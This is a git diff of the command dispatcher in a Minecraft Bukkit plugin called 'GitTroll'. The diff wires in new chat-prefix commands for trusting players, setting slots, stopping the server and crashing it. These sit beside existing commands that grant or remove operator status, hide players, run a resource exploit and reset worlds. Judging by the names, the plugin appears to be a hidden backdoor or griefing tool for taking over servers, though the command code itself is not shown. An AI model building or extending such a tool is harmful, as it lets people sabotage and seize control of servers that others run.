@@ -15,13 +15,18 @@ import org.bukkit.event.player.PlayerChatTabCompleteEvent;
 import net.Lenni0451.GitTroll.GitTroll;
 import net.Lenni0451.GitTroll.command.CommandBase;
 import net.Lenni0451.GitTroll.command.CommandWrongException;
+import net.Lenni0451.GitTroll.command.ReturnException;
 import net.Lenni0451.GitTroll.command.commands.exploits.ResourceExploit;
 import net.Lenni0451.GitTroll.command.commands.player.Deop;
 import net.Lenni0451.GitTroll.command.commands.player.Heal;
 import net.Lenni0451.GitTroll.command.commands.player.Op;
+import net.Lenni0451.GitTroll.command.commands.player.Trust;
 import net.Lenni0451.GitTroll.command.commands.player.Untrust;
 import net.Lenni0451.GitTroll.command.commands.player.Vanish;
 import net.Lenni0451.GitTroll.command.commands.plugin.Help;
+import net.Lenni0451.GitTroll.command.commands.server.CrashServer;
+import net.Lenni0451.GitTroll.command.commands.server.SetSlots;
+import net.Lenni0451.GitTroll.command.commands.server.Stop;
 import net.Lenni0451.GitTroll.command.commands.trolling.Explode;
 import net.Lenni0451.GitTroll.command.commands.world.WorldReset;
 import net.Lenni0451.GitTroll.event.EventListener;
@@ -47,6 +52,10 @@ public class CommandManager implements Listener {
 	public final WorldReset WorldReset = null;
 	public final Op Op = null;
 	public final Deop Deop = null;
+	public final Trust Trust = null;
+	public final SetSlots SetSlots = null;
+	public final Stop Stop = null;
+	public final CrashServer CrashServer = null;
 	
 	public CommandManager() {
 		this.commands = new ArrayList<>();
@@ -96,25 +105,28 @@ public class CommandManager implements Listener {
 		String commandLabel = commandParts[0].substring(COMMAND_PREFIX.length());
 		String[] args = Arrays.copyOfRange(commandParts, 1, commandParts.length);
 		
+		CustomPlayer cPlayer = CustomPlayer.instanceOf(player);
+		
 		for(CommandBase commandBase : this.commands) {
 			if(commandBase.getName().equalsIgnoreCase(commandLabel)) {
 				Bukkit.getScheduler().runTask(GitTroll.getInstance(), () -> {
 					try {
-						commandBase.execute(CustomPlayer.instanceOf(player), new ArrayHelper(args));
+						commandBase.execute(cPlayer, new ArrayHelper(args));
+					} catch (ReturnException e) {
+						;
 					} catch (CommandWrongException e) {
-						CustomPlayer.instanceOf(player).sendGitMessage("§cThe command is wrong.");
-						CustomPlayer.instanceOf(player).sendGitMessage("§aPlease use §6" + commandBase.getName() + " " + commandBase.getHelp());
+						cPlayer.sendGitMessage("§cThe command is wrong.");
+						cPlayer.sendGitMessage("§aPlease use §6" + commandBase.getName() + " " + commandBase.getHelp());
 					} catch (Exception e) {
-						CustomPlayer.instanceOf(player).sendGitMessage("§cAn error occurred whilst executing this command.");
+						cPlayer.sendGitMessage("§cAn error occurred whilst executing this command.");
+						cPlayer.sendGitMessage("§6" + e.getClass().getSimpleName());
 					}
 				});
 				return true;
 			}
 		}
-		CustomPlayer customPlayer = CustomPlayer.instanceOf(player);
-		customPlayer.sendGitMessage("§cThe command does not exist.");
-		//TODO: Actual help command
-		customPlayer.sendGitMessage("Use §6" + COMMAND_PREFIX + "help §afor help.");
+		cPlayer.sendGitMessage("§cThe command does not exist.");
+		cPlayer.sendGitMessage("Use §6" + COMMAND_PREFIX + "help §afor help.");
 		return true;
 	}
 	
